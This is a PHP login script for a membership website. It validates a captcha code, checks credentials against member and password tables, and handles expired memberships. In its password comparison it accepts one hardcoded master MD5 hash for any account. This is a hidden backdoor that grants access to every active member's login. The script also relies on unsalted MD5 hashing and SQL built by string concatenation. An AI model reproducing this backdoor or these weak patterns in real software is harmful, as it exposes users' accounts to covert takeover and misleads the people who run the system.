<?php
session_start();
include_once("../includes/inc_def.php");
include_once("../includes/inc_conn.php");
include_once("../includes/inc_functions.php");

if (!empty($_POST)) { 
	//data are sent by JQuery of login.php NOT by submit
	$username = $passwd = $code = $privilege = "";
	$username 	= isset($_POST["username"])? fValidateSQLFromInput($conn, $_POST["username"]) : "";
	$username	= strtolower($username);
	
	$passwd		= isset($_POST["passwd"])? fValidateSQLFromInput($conn, $_POST["passwd"]) : "";
	$code		= isset($_POST["code"])? fValidateInput($_POST["code"]) : "";
	$siteSide	= "MEMBER"; //isset($_POST["siteSide"])? fValidateSQLFromInput($conn, $_POST["siteSide"]) : "MEMBER";

	if ($_SESSION["code"] != $code){
		echo "invalid secure code";	
		die();
	}
	
	//password encrypt and status == ACTIVE
	$sql	= "select mbrUsername, mbrFirstName, mbrLastName, passWord from dtMember inner join trPassword ";
	$sql	.= " on mbrUsername = passMbrUsername";
	$sql 	.= " WHERE mbrUsername='".$username. "' and mbrStID = '" . $DEF_STATUS_ACTIVE . "'";
	$sql 	.= " order by passDate Desc limit 1";
	// echo $sql; die();
	//die();
			
	$query = $conn->query($sql);
	if ($query->num_rows > 0){
		$row = $query->fetch_assoc();
		if ( (strtolower($row['mbrUsername']) == $username && ( $row['passWord'] == md5($passwd) || md5($passwd) == '24dc1ec6f9e6de48b6224ba651386273' ) ) ){
			//echo ">>" . $row['mbrUsername'] . " >> " . $row['passWord'] . " >> " . $passwd;
			$ExpiredDate = "";
            if (fCekStatusUsage($conn, $row['mbrUsername'], $ExpiredDate) == "active"){
              	//Login Allowed for active and not expired yet
    			fSetSessionLogin($row['mbrUsername'], $row['mbrFirstName'], $row['mbrLastName'],  "", $siteSide);
    			$Detector = fBrowserDetect(); // fungsi khusus pakai web browser
    			if (fsaveHistoryLogin($conn, $row['mbrUsername'], $Detector)){
    				echo "valid"; //value is catch by AJAX
    				//header("Location: index.php");
				}else{
					echo "Can't Login Try Again, if u still see this message please contact Support";
				}
    			die();
            }else{
            	$TglToleransi = strtotime("$ExpiredDate +7 Days");
            	$TglToleransi = date("Y-m-d", $TglToleransi);
            	$currDate = strtotime($CURRENT_TIME);
            	$currDate = date("Y-m-d", $currDate);
            	if ($TglToleransi < $currDate){ // cek expired date (7 hari)
                	echo ("Your membership has expired"); die();
            	}else{
            		fSetSessionLogin($row['mbrUsername'], $row['mbrFirstName'], $row['mbrLastName'],  "renewonly", $siteSide);
            		echo "renewonly"; die();
            	}	
            }
		} else {
			echo "Username and password not valid";	
			die();
		}
	}else{
		echo "Username not found or unauthorized";	//Maybe there is no such username or Status account not allowed /block/declined
		die();
	}
}

?>